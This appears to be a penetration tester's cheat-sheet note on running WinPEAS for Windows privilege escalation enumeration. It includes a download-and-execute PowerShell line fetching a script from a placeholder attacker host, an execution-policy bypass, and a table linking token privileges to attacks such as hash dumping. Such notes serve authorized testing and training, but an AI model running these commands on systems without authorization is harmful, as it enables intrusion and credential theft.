
# WinPEAS

Part of the [PEASS-ng](https://github.com/peass-ng/PEASS-ng) suite. Automates Windows privilege escalation enumeration.

---

## Transfer to Target

→ [[File-Transfers]]

---

## Run

```powershell
# Standard run
.\winpeas.exe

# Save output to file
.\winpeas.exe > winpeas_output.txt

# Run specific category only
.\winpeas.exe systeminfo
.\winpeas.exe userinfo
.\winpeas.exe servicesinfo

# In-memory  -  no file written to disk
iex(new-object net.webclient).downloadstring('http://<attacker-ip>/winpeas.ps1')
```

> If execution is blocked, try: `powershell -ep bypass`

---

## Output Color Guide

Enable ANSI colors first if they don't render:
```powershell
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

| Color | Meaning |
|-------|---------|
| RED | High-priority finding  -  investigate |
| Yellow | Interesting  -  worth reviewing |
| Cyan | Info / current user context |
| Green | Low-risk / informational |

---

## Key Sections to Focus On

1. **System Info**  -  OS version, hotfixes, architecture
2. **Users & Groups**  -  current user, local admins, logged-on users
3. **Token Privileges**  -  `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeDebugPrivilege`
4. **Services**  -  unquoted service paths, writable service binaries
5. **Scheduled Tasks**  -  tasks running as SYSTEM with writable script paths
6. **Credentials**  -  saved creds, registry passwords, credential manager
7. **PowerShell History**  -  `ConsoleHost_history.txt`

---

## High-Value Token Privileges

| Privilege | Attack Path |
|-----------|-------------|
| `SeImpersonatePrivilege` | PrintSpoofer, GodPotato, JuicyPotato |
| `SeBackupPrivilege` | Read SAM/SYSTEM hive → dump hashes |
| `SeDebugPrivilege` | Inject into SYSTEM processes |
| `SeTakeOwnershipPrivilege` | Take ownership of any file |

---

## See Also

- [[Privilege-Escalation]]  -  full PrivEsc methodology
- [LOLBAS](https://lolbas-project.github.io/)  -  exploit anything WinPEAS flags
- [PEASS-ng GitHub](https://github.com/peass-ng/PEASS-ng)  -  latest release
